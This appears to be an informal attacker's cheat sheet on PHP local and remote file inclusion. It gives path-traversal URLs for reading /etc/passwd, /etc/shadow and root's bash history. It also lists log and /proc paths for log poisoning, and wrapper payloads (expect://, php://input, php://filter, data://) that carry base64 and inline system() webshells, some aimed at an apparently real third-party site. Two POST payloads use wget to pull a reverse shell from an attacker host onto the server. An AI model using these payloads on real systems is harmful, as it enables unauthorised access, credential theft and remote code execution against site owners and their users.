File inclusion are of two types : fucking obvious
	1. Local file inclusion
	2. Remote file inclusion

Local file inclusion: so basically local file inclusion occurs when the web application is asking for a file input and there are no proper sanitization. It will look like this $file = $_GET['file']; 
But in this,allow url include will be turned off that means we cannot include URLs otherwise this will beome our remote include

So lets say you found out a Local file inclusion attack with this
http://example.com/?file=../../../../etc/passwd
Or this can 
http://example.com/some.php?page=../../../../../etc/passwd

You can look for all these files
/etc/issue
– /proc/version
– /etc/profile
– /etc/passwd
– /etc/passwd
– /etc/shadow
– /root/.bash_history
– /var/log/dmessage
– /var/mail/root
– /var/spool/cron/crontabs/root


So how can you get a shell after this let's find out:
/proc/self/environ
/proc/self/cmdline
/proc/apm - Provides information on Advanced Power Management
Proc/acpi
Proc/stat
/var/log/messages
/var/log/auth.log = ssh log
/var/log/apache2/access.log
/var/log/apache2/error.log


If the /proc/self/environ is working then we can include php error and then execute commands

If /proc/self/cmdline is included then 
Then /proc/self/fd/[id] - id can be between 0-10 and if any id found, then look for what files might be getting affected then inject that file with php script and use it to execute command

Example:





PHP Wrapper expect:// LFI
Allows execution of system commands via the php expect wrapper, 
http://127.0.0.1/fileincl/example1.php?page=expect://ls


PHP Wrapper php://file
Another PHP wrapper, php://input your payload is sent in a POST request using curl, burp or hackbar to provide the post data is probably the easiest option.



<? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>


PHP Wrapper php://filter

http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd

Using data:// wrapper
http://www.zamenfeld.com.ar/main.php?pagina=data:text/plain,<?system($_GET['x']);?>&x=ls

http://www.zamenfeld.com.ar/main.php?pagina=data:,<?system($_GET['x']);?>&x=ls

http://www.zamenfeld.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls


Some Common log Files:=>

/etc/httpd/logs/acces_log
/etc/httpd/logs/acces.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/var/log/apache/error_log
/var/log/apache2/error_log
/var/log/apache/error.log
/var/log/apache2/error.log
/var/log/error_log
/var/log/error.log
/var/www/logs/error_log
/var/www/logs/error.log



Remote file inclusion:
The simplest way will be through python server and using it to open shell and listen on it

But sometimes we need to upload the shell so 
We'll use php://input method to upload a shell
For example:
http://10.11.1.8//internal/advanced_comment_system/admin.php?ACS_path=php://input%00
And in post data:
<?system('wget http://10.11.0.152/shell.php.txt -O /tmp/exploit.php');?>

You can also try <?system('<any system commands>');?>
